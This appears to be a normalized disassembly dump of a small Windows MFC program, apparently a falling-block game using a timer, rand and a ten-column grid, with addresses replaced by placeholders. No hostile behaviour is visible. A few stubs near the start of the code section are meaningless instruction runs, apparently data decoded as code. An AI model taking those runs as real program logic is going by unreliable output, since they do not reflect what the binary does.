call sub_403b60
xor esi esi
xor esi esi
add esi 0x8
cmp esi 0x20
jl rwxdata
mov edx [ rwxdata ]
push edx
call sub_404800
mov ecx [ eax + esi + 0x28 ]
mov edx [ rwxdata ]
sub ecx edx
mov eax 0x51eb851f
imul ecx
mov ecx [ rwxdata ]
sar edx 0x3
mov eax edx
push ecx
shr eax 0x1f
add edx eax
mov edi edx
call sub_404800
mov ecx [ eax + esi + 0x2c ]
mov eax [ rwxdata ]
sub ecx eax
mov eax 0x51eb851f
imul ecx
sar edx 0x3
mov eax edx
add esi 0x8
shr eax 0x1f
add edx eax
add esp 0x8
add edi edx
cmp esi 0x20
lea ecx [ edx + edx * 4 ]
mov [ edi + ecx * 2 + rwxdata ] 0x0
jl rwxdata
call [ rand@IAT ]
lea eax [ eax + eax * 2 ]
mov ecx 0x7
cdq
idiv ecx
push edx
mov [ rwxdata ] edx
call sub_404800
mov eax [ rwxdata ]
mov edi [ rwxdata ]
sub eax edi
add esp 0x4
cdq
sub eax edx
mov edx [ rwxdata ]
sar eax 0x1
sub eax 0xc
pop edi
pop esi
mov [ rwxdata ] eax
mov [ rwxdata ] edx
pop ebp
retn 0x4
mov ecx [ rwxdata ]
push ecx
call sub_404800
mov ecx [ eax + esi + 0x28 ]
mov eax [ rwxdata ]
sub ecx eax
mov eax 0x51eb851f
imul ecx
mov ecx [ rwxdata ]
sar edx 0x3
mov eax edx
push ecx
shr eax 0x1f
add edx eax
mov edi edx
call sub_404800
mov ecx [ eax + esi + 0x2c ]
mov edx [ rwxdata ]
sub ecx edx
mov eax 0x51eb851f
imul ecx
sar edx 0x3
mov eax edx
add esp 0x8
shr eax 0x1f
add edx eax
add edi edx
lea ecx [ edx + edx * 4 ]
mov al [ edi + ecx * 2 + rwxdata ]
test al al
je rwxdata
mov eax [ rwxdata ]
cmp eax 0xa
jle rwxdata
inc eax
mov [ rwxdata ] eax
mov eax [ ebp + 0x20 ]
push 0x1
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov ecx ebp
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebp
retn 0x4
cmp eax 0x64
jge rwxdata
push 0x0
mov ecx ebp
call sub_405330
sub_4050f0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
call Ordinal_MFC42_4464
cmp eax 0xffffffff
jne rwxdata
mov [ rwxdata ] 0x0
mov ecx [ esi + 0x20 ]
push 0x0
push 0x96
push 0x1
push ecx
call [ SetTimer@IAT ]
lea edx [ esp + 0x8 ]
push edx
call [ time@IAT ]
lea eax [ esp + 0xc ]
push eax
call [ gmtime@IAT ]
mov ecx [ eax ]
push ecx
call [ srand@IAT ]
add esp 0xc
xor eax eax
pop esi
retn 0x4
or eax eax
pop esi
retn 0x4
sub_405150
mov eax [ rwxdata ]
push ebx
push esi
push edi
mov ebx ecx
push eax
call sub_404800
mov edx [ esp + 0x14 ]
mov ecx eax
add esp 0x4
lea eax [ edx - 0x25 ]
cmp eax 0x3
ja rwxdata
mov ecx ebx
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebx
retn 0xc
jmp [ eax * 4 + jump_table_40530c ]
mov ax [ ecx + 0x24 ]
inc ax
movsx eax ax
cdq
idiv [ ecx + 0x50 ]
mov [ ecx + 0x24 ] dx
mov ecx ebx
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebx
retn 0xc
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
cmp eax ecx
jle rwxdata
xor esi esi
xor edi edi
add eax 0x19
mov ecx ebx
mov [ rwxdata ] eax
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebx
retn 0xc
sub eax 0x19
add esi 0x8
cmp esi 0x20
jl rwxdata
lea eax [ edx + edx * 4 ]
add edi edx
mov cl [ edi + eax * 2 + rwxdata ]
test cl cl
jne rwxdata
add edi 0x8
cmp edi 0x20
jl rwxdata
lea eax [ edx + edx * 4 ]
add esi edx
mov cl [ esi + eax * 2 + rwxdata ]
test cl cl
jne rwxdata
mov ecx [ rwxdata ]
push ecx
call sub_404800
mov ecx [ eax + esi + 0x28 ]
mov eax [ rwxdata ]
sub ecx eax
mov eax 0x51eb851f
imul ecx
mov ecx [ rwxdata ]
sar edx 0x3
mov eax edx
push ecx
shr eax 0x1f
add edx eax
mov edi edx
call sub_404800
mov ecx [ eax + esi + 0x2c ]
mov edx [ rwxdata ]
sub ecx edx
mov eax 0x51eb851f
imul ecx
sar edx 0x3
mov eax edx
lea ecx [ edi - 0x1 ]
shr eax 0x1f
add esp 0x8
add edx eax
test ecx ecx
jl rwxdata
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
cmp eax ecx
jge rwxdata
add [ rwxdata ] 0x19
mov ecx [ rwxdata ]
push ecx
call sub_404800
mov ecx [ eax + edi + 0x28 ]
mov eax [ rwxdata ]
sub ecx eax
mov eax 0x51eb851f
imul ecx
mov ecx [ rwxdata ]
sar edx 0x3
mov eax edx
push ecx
shr eax 0x1f
add edx eax
mov esi edx
call sub_404800
mov ecx [ eax + edi + 0x2c ]
mov edx [ rwxdata ]
sub ecx edx
mov eax 0x51eb851f
imul ecx
sar edx 0x3
mov eax edx
lea ecx [ esi + 0x1 ]
shr eax 0x1f
add esp 0x8
add edx eax
cmp ecx 0xa
jg rwxdata
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
cmp eax ecx
jle rwxdata
sub [ rwxdata ] 0x19
sub eax 0x19
mov ecx ebx
mov [ rwxdata ] eax
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebx
retn 0xc
add eax 0x19
add eax 0x19
mov [ rwxdata ] eax
sub eax 0x19
sub_405330
sub esp 0x170
lea eax [ esp + 0x30 ]
push ebx
push esi
mov ebx ecx
push edi
mov ecx 0xa
mov esi rwxdata
lea edi [ esp + 0x14 ]
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
call [ FindFirstFileA@IAT ]
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
jne rwxdata
lea edx [ esp + 0x14 ]
push 0x1f25
push rwxdata
mov ecx ebx
mov [ esp + 0x14 ] edx
call sub_404dd0
push 0x0
call [ exit@IAT ]
push eax
call [ exit@IAT ]
sub_4053f0
push 0xffffffff
push sub_406128
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405460
push 0xffffffff
push sub_406148
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4054d0
push 0xffffffff
push sub_406168
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405540
push 0xffffffff
push sub_406188
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405590
push 0xffffffff
push sub_4061aa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x1e0
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je rwxdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_405630
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405630
push 0xffffffff
push sub_4061d6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call Ordinal_MFC42_366
lea ecx [ esi + 0xc0 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_529
lea ecx [ esi + 0x140 ]
mov [ esp + 0x10 ] 0x1
call Ordinal_MFC42_554
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4056b0
push 0xffffffff
push sub_4061f6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
lea ecx [ esi + 0x140 ]
mov [ esp + 0x10 ] 0x1
call Ordinal_MFC42_807
lea ecx [ esi + 0xc0 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_796
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_674
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405720
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
call Ordinal_MFC42_4457
cmp eax 0xffffffff
je rwxdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0x4
push 0xe800
xor eax eax
sub esp 0x10
xor ecx ecx
mov ebp esp
xor edx edx
lea edi [ esi + 0x140 ]
push 0x50402834
mov [ ebp ] eax
xor ebx ebx
push 0x800
push esi
mov [ ebp + 0x4 ] ecx
mov ecx edi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] ebx
call Ordinal_MFC42_6625
test eax eax
je rwxdata
push 0x80
mov ecx edi
call Ordinal_MFC42_4163
test eax eax
je rwxdata
lea ebx [ esi + 0xc0 ]
push 0xe801
push 0x50008200
push esi
mov ecx ebx
call Ordinal_MFC42_2117
test eax eax
je rwxdata
push 0x4
push rwxdata
mov ecx ebx
call Ordinal_MFC42_6000
test eax eax
je rwxdata
push 0xf000
mov ecx edi
call Ordinal_MFC42_2626
push 0x0
mov ecx edi
call Ordinal_MFC42_6215
push 0x0
mov ecx ebx
call Ordinal_MFC42_6215
push 0xf000
mov ecx esi
call Ordinal_MFC42_2627
push 0x0
push 0x0
push edi
mov ecx esi
call Ordinal_MFC42_2494
push 0x0
mov ecx esi
call sub_4058b0
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
sub_405810
push esi
mov esi [ esp + 0x8 ]
push esi
call Ordinal_MFC42_5252
test eax eax
jne rwxdata
mov al [ rwxdata ]
push edi
mov edi [ GetSystemMetrics@IAT ]
test al 0x1
jne rwxdata
pop esi
retn 0x4
mov cl [ rwxdata ]
mov al 0x2
test al cl
jne rwxdata
mov cl al
push 0x0
or cl 0x1
mov [ rwxdata ] cl
call edi
mov [ rwxdata ] eax
mov eax 0x55555556
pop edi
imul [ rwxdata ]
mov eax edx
shr eax 0x1f
add edx eax
mov eax 0x38e38e39
mov [ esi + 0x1c ] edx
mov ecx [ rwxdata ]
imul ecx
sar edx 0x1
mov ecx edx
mov [ esi + 0x14 ] 0x11f
shr ecx 0x1f
add edx ecx
mov [ esi + 0x10 ] 0x264
mov [ esi + 0x18 ] edx
mov eax 0x1
pop esi
retn 0x4
or cl al
push 0x1
mov [ rwxdata ] cl
call edi
mov [ rwxdata ] eax
sub_4058b0
mov eax [ rwxdata ]
push esi
test eax eax
mov esi ecx
jne rwxdata
mov cl [ esp + 0x8 ]
test cl cl
je rwxdata
test esi esi
je rwxdata
test esi esi
jne rwxdata
test esi esi
jne rwxdata
push eax
call [ GetMenu@IAT ]
mov [ rwxdata ] eax
mov eax [ esi + 0x20 ]
mov eax [ esi + 0x20 ]
xor eax eax
jmp rwxdata
mov ecx [ esi + 0x20 ]
xor ecx ecx
jmp rwxdata
push 0x0
push eax
call [ SetMenu@IAT ]
push 0x20
push 0x0
push 0xc00000
mov ecx esi
call Ordinal_MFC42_4284
pop esi
retn 0x4
push eax
push ecx
call [ SetMenu@IAT ]
push 0x20
push 0xc00000
push 0x0
mov ecx esi
call Ordinal_MFC42_4284
pop esi
retn 0x4
_start
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rwxdata ] 0xffffffff
or [ rwxdata ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rwxdata ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rwxdata ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rwxdata ] eax
call sub_405f95
cmp [ rwxdata ] ebx
jne rwxdata
call sub_405f80
push rwxdata
push rwxdata
call _initterm
mov eax [ rwxdata ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rwxdata ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rwxdata
push rwxdata
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne rwxdata
push sub_405f92
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe rwxdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je rwxdata
mov al [ esi ]
cmp al bl
je rwxdata
inc esi
mov [ ebp - 0x74 ] esi
jmp rwxdata
cmp [ esi ] 0x22
jne rwxdata
cmp al 0x22
jne rwxdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je rwxdata
cmp al 0x20
jbe rwxdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp rwxdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_405fa2
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_405fba
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne rwxdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_401564
aad 0xd0
0xdd672072 0x5ad0
sub_40157c
dec ecx
rcl al 0x1
rcl al 0x1
ror [ edi + 0x24d06f53 ] 0x1

sub_401598
out 0x87 eax
aam 0x59
aam 0x62
push ebx
pop ss
salc
mov ebx 0x85f38b0
hlt
sub_402101
push ecx
inc esi
aas
fwait
retn
sub_402334
cmpsb [ esi ] [ edi ]
scasd [ edi ]
scasd [ edi ]
cmp [ edx ] 0xffffffd0
scasd [ edi ]
add [ ecx - 0x6b ] bl
lodsb [ esi ]
mov eax 0xd0d0d18c
mov bh 0x93
jmp 0x561b0ebb
sub_403b00
mov edx ecx
push edi
mov ecx 0x8
xor eax eax
lea edi [ edx + 0x4 ]
mov [ edx ] rwxdata
[ edi ]
mov [ edx + 0x24 ] ax
mov eax edx
pop edi
retn
sub_403b20
push esi
mov esi ecx
call sub_403b40
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_403b40
mov [ ecx ] rwxdata
retn
sub_403b50
retn 0x10
sub_403dc0
push esi
mov esi ecx
call sub_403fd0
mov eax 0x1
mov [ esi + 0x48 ] 0x2
mov [ esi + 0x18 ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] 0x3
pop esi
retn 0x10
sub_403fd0
push edi
lea edi [ ecx + 0x4 ]
mov ecx 0x8
xor eax eax
[ edi ]
pop edi
retn
sub_403fe0
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_403ff0
mov eax rwxdata
retn
sub_404000
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_404020
push esi
mov esi ecx
call sub_404040
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_404040
jmp Ordinal_MFC42_815
sub_404050
call sub_404060
jmp sub_404070
sub_404060
mov ecx rwxdata
jmp sub_404000
sub_404070
push sub_404080
call sub_405df4
pop ecx
retn
sub_404080
mov ecx rwxdata
jmp sub_404040
sub_4041e0
push esi
push 0x0
mov esi ecx
push 0x64
call Ordinal_MFC42_324
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_404200
push esi
mov esi ecx
call sub_404220
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_404220
jmp Ordinal_MFC42_641
sub_404230
mov eax [ Ordinal_MFC42_4234@IAT ]
retn
sub_404240
mov eax rwxdata
retn
sub_4042b0
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_825
pop ecx
retn 0x4
sub_4042c0
retn
sub_4042d0
retn 0x4
sub_4042e0
mov eax [ ecx + 0x20 ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_4042f0
mov eax [ ecx + 0x20 ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
sub_404360
mov eax [ Ordinal_MFC42_1825@IAT ]
retn
sub_404370
mov eax rwxdata
retn
sub_404380
mov eax [ Ordinal_MFC42_4238@IAT ]
retn
sub_404390
mov eax rwxdata
retn
sub_4043a0
push esi
mov esi ecx
call Ordinal_MFC42_338
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_4043c0
push esi
mov esi ecx
call sub_4043e0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4043e0
mov [ ecx ] rwxdata
jmp Ordinal_MFC42_652
sub_4043f0
call Ordinal_MFC42_4823
neg eax
sbb eax eax
neg eax
retn
sub_404400
retn 0x4
sub_404410
mov eax [ ecx + 0x48 ]
retn
sub_404420
mov eax [ esp + 0x4 ]
mov [ ecx + 0x48 ] eax
retn 0x4
sub_404430
jmp rwxdata
retn
sub_404450
call sub_404460
jmp sub_404490
sub_404460
mov ecx rwxdata
jmp sub_404470
sub_404470
push esi
mov esi ecx
call sub_403b00
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x4
mov eax esi
pop esi
retn
sub_404490
push sub_4044a0
call sub_405df4
pop ecx
retn
sub_4044a0
mov ecx rwxdata
jmp j_sub_403b40
sub_4044b0
call sub_4044c0
jmp sub_404500
sub_4044c0
mov ecx rwxdata
jmp sub_4044d0
sub_4044d0
push esi
mov esi ecx
call sub_403b00
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x1
mov eax esi
pop esi
retn
j_sub_403b40
jmp sub_403b40
sub_404500
push sub_404510
call sub_405df4
pop ecx
retn
sub_404510
mov ecx rwxdata
jmp j_sub_403b40
sub_404520
call sub_404530
jmp sub_404560
sub_404530
mov ecx rwxdata
jmp sub_404540
sub_404540
push esi
mov esi ecx
call sub_403b00
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x2
mov eax esi
pop esi
retn
sub_404560
push sub_404570
call sub_405df4
pop ecx
retn
sub_404570
mov ecx rwxdata
jmp j_sub_403b40
sub_404580
call sub_404590
jmp sub_4045c0
sub_404590
mov ecx rwxdata
jmp sub_4045a0
sub_4045a0
push esi
mov esi ecx
call sub_403b00
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x2
mov eax esi
pop esi
retn
sub_4045c0
push sub_4045d0
call sub_405df4
pop ecx
retn
sub_4045d0
mov ecx rwxdata
jmp j_sub_403b40
sub_4045e0
call sub_4045f0
jmp sub_404620
sub_4045f0
mov ecx rwxdata
jmp sub_404600
sub_404600
push esi
mov esi ecx
call sub_403b00
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x4
mov eax esi
pop esi
retn
sub_404620
push sub_404630
call sub_405df4
pop ecx
retn
sub_404630
mov ecx rwxdata
jmp j_sub_403b40
sub_404640
call sub_404650
jmp sub_4046a0
sub_404650
mov ecx rwxdata
jmp sub_404660
sub_404660
push esi
mov esi ecx
call sub_403b00
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x4
mov eax esi
pop esi
retn
sub_404680
push esi
mov esi ecx
call j_sub_403b40
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4046a0
push sub_4046b0
call sub_405df4
pop ecx
retn
sub_4046b0
mov ecx rwxdata
jmp j_sub_403b40
sub_4046c0
call sub_4046d0
jmp sub_404700
sub_4046d0
mov ecx rwxdata
jmp sub_4046e0
sub_4046e0
push esi
mov esi ecx
call sub_403b00
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x2
mov eax esi
pop esi
retn
sub_404700
push sub_404710
call sub_405df4
pop ecx
retn
sub_404710
mov ecx rwxdata
jmp j_sub_403b40
sub_404780
mov eax [ Ordinal_MFC42_1945@IAT ]
retn
sub_404790
mov eax rwxdata
retn
sub_4047a0
mov eax [ Ordinal_MFC42_4273@IAT ]
retn
sub_4047b0
mov eax rwxdata
retn
sub_4048c0
push esi
mov esi ecx
call sub_4048e0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4048e0
mov [ ecx ] rwxdata
jmp Ordinal_MFC42_813
sub_4048f0
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_5260
retn 0x4
sub_404db0
mov eax [ esp + 0x4 ]
cdq
idiv [ esp + 0x8 ]
cmp eax 0x2
sete al
retn 0x8
sub_404ef0
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_2535
retn 0x4
sub_404f00
retn 0x8
sub_40531c
nop
nop
nop
nop
mov eax 0x1
retn 0x4
sub_4053c0
mov [ ecx ] rwxdata
retn
sub_4053d0
push esi
mov esi ecx
call sub_4053f0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_405440
push esi
mov esi ecx
call sub_405460
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4054b0
push esi
mov esi ecx
call sub_4054d0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_405520
push esi
mov esi ecx
call sub_405540
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4055f0
mov eax [ Ordinal_MFC42_1842@IAT ]
retn
sub_405600
mov eax rwxdata
retn
sub_405610
mov eax [ Ordinal_MFC42_4242@IAT ]
retn
sub_405620
mov eax rwxdata
retn
sub_405690
push esi
mov esi ecx
call sub_4056b0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_4615
jmp [ Ordinal_MFC42_4615@IAT ]
Ordinal_MFC42_4612
jmp [ Ordinal_MFC42_4612@IAT ]
Ordinal_MFC42_4610
jmp [ Ordinal_MFC42_4610@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_6215
jmp [ Ordinal_MFC42_6215@IAT ]
Ordinal_MFC42_617
jmp [ Ordinal_MFC42_617@IAT ]
Ordinal_MFC42_5301
jmp [ Ordinal_MFC42_5301@IAT ]
Ordinal_MFC42_5214
jmp [ Ordinal_MFC42_5214@IAT ]
Ordinal_MFC42_296
jmp [ Ordinal_MFC42_296@IAT ]
Ordinal_MFC42_986
jmp [ Ordinal_MFC42_986@IAT ]
Ordinal_MFC42_520
jmp [ Ordinal_MFC42_520@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
Ordinal_MFC42_4159
jmp [ Ordinal_MFC42_4159@IAT ]
Ordinal_MFC42_2621
jmp [ Ordinal_MFC42_2621@IAT ]
Ordinal_MFC42_1134
jmp [ Ordinal_MFC42_1134@IAT ]
Ordinal_MFC42_5265
jmp [ Ordinal_MFC42_5265@IAT ]
Ordinal_MFC42_4376
jmp [ Ordinal_MFC42_4376@IAT ]
Ordinal_MFC42_4853
jmp [ Ordinal_MFC42_4853@IAT ]
Ordinal_MFC42_4998
jmp [ Ordinal_MFC42_4998@IAT ]
Ordinal_MFC42_4710
jmp [ Ordinal_MFC42_4710@IAT ]
Ordinal_MFC42_2514
jmp [ Ordinal_MFC42_2514@IAT ]
Ordinal_MFC42_6052
jmp [ Ordinal_MFC42_6052@IAT ]
Ordinal_MFC42_4078
jmp [ Ordinal_MFC42_4078@IAT ]
Ordinal_MFC42_1775
jmp [ Ordinal_MFC42_1775@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5241
jmp [ Ordinal_MFC42_5241@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5280
jmp [ Ordinal_MFC42_5280@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4441
jmp [ Ordinal_MFC42_4441@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
